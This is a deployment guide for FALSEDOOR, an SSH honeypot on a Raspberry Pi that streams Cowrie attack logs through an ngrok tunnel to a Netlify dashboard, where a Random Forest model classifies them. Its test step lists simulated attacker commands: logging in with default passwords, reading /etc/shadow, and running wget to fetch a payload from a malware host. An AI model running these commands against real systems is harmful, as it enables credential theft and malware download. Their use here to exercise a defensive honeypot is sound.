# FALSEDOOR — Netlify & Raspberry Pi Live Deployment Guide

This guide explains how to connect your **Netlify-hosted dashboard** (`https://falsedoor.netlify.app/`) with your **Raspberry Pi (Ubuntu Server)** honeypot so attack data is displayed live in real-time.

> [!TIP]
> **Zero Code Editing & Zero `nano` Required!**  
> Everything is completely automated. You just unzip the package on your Ubuntu server, run one command (`bash start.sh`), and paste the generated ngrok URL directly into your Netlify dashboard inside your browser!

---

## Architecture Overview

```
                                      INTERNET
                                         │
        ┌────────────────────────────────┴────────────────────────────────┐
        │                                                                 │
        ▼                                                                 ▼
┌───────────────────────────────┐               ┌─────────────────────────────────────────┐
│     NETLIFY DASHBOARD         │               │         RASPBERRY PI (UBUNTU)           │
│  https://falsedoor.netlify.app│               │                                         │
│                               │  fetches API  │  ┌───────────────────────────────────┐  │
│  • PWA Static Frontend        │───────────────┼─▶│ FastAPI Backend (:8000)           │  │
│  • Mobile & Desktop View      │  (via ngrok)  │  │ • CORS configured for Netlify     │  │
│  • Live In-Browser URL modal  │               │  └─────────────────┬─────────────────┘  │
│    every 3s polling           │               │                    │ reads logs         │
└───────────────────────────────┘               │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Cowrie SSH Honeypot (:2222)       │  │
                                                │  │ • Attacks recorded live           │  │
                                                │  │ • cowrie.json audit log           │  │
                                                │  └─────────────────┬─────────────────┘  │
                                                │                    │ ML classification  │
                                                │                    ▼                    │
                                                │  ┌───────────────────────────────────┐  │
                                                │  │ Random Forest Classifier          │  │
                                                │  │ • 100 Trees (Scikit-Learn)        │  │
                                                │  └───────────────────────────────────┘  │
                                                └─────────────────────────────────────────┘
```

---

## Step 1: Run the One-Click Launcher on Raspberry Pi

1. **Transfer `FALSEDOOR_UBUNTU_DEPLOY.zip` to your Raspberry Pi:**
   ```bash
   scp FALSEDOOR_UBUNTU_DEPLOY.zip ubuntu@<YOUR_PI_IP>:~/
   ```
   *(Or transfer via USB flash drive / SFTP, or clone the GitHub repo)*

2. **Unzip and start:**
   ```bash
   unzip FALSEDOOR_UBUNTU_DEPLOY.zip -d ~/FALSEDOOR
   cd ~/FALSEDOOR
   bash start.sh
   ```

### What `bash start.sh` does automatically:
- Installs Python3 and virtual environment
- Installs all dependencies (`requirements.txt`)
- Trains & validates the Random Forest machine learning model
- Configures your UFW firewall (opens ports 8000 & 2222)
- Installs `ngrok` and authenticates your token
- Launches the FastAPI backend engine
- Starts the secure ngrok public HTTPS tunnel
- **Prints your live public URL on the screen!**

You will see:
```text
╔══════════════════════════════════════════════════════════════════╗
║          FALSEDOOR HONEYPOT & TELEMETRY STREAM IS LIVE!          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  🎯 Honeypot SSH Port:  2222 (Ready for attacker connections)    ║
║  ⚡ Local API:          http://192.168.1.50:8000                 ║
║  🌐 Public ngrok URL:   https://xxxx-xx-xx-xx.ngrok-free.app     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Step 2: Connect Netlify (Directly in Your Browser!)

You do **NOT** need to open `nano` or edit any files:

1. Open your browser and go to: **[https://falsedoor.netlify.app/](https://falsedoor.netlify.app/)**
2. Touch or click the fingerprint scanner to enter the SOC dashboard.
3. Click the **`[STREAMING LIVE]`** / **`[CONNECT PI 📡]`** badge at the top right of the screen.
4. A popup window **"HIVE TELEMETRY CONNECTION"** will appear.
5. Paste your public ngrok URL (e.g. `https://xxxx-xx-xx-xx.ngrok-free.app`).
6. Click **`Save & Connect`**.

> [!NOTE]
> The URL is saved in your browser's local storage. You only have to paste it once, and whenever you start a new tunnel, you can update it right from the web page in 2 seconds!

---

## Step 3: Test Real-Time Attacks

1. From any other computer, your phone terminal (Termux), or an external Wi-Fi:
   ```bash
   ssh root@<YOUR_PI_IP_OR_HOSTNAME> -p 2222
   ```
2. Enter decoy passwords: `admin`, `123456`, `password`, `root`
3. Execute decoy shell commands:
   ```bash
   uname -a
   cat /etc/shadow
   wget http://malware.sh/payload.bin
   ```
4. **Watch your Netlify site:**
   Within 3 seconds, `https://falsedoor.netlify.app/` will flash with the new live attack, update the attacker IP counter, draw the pie chart slices, and run the Random Forest classification!
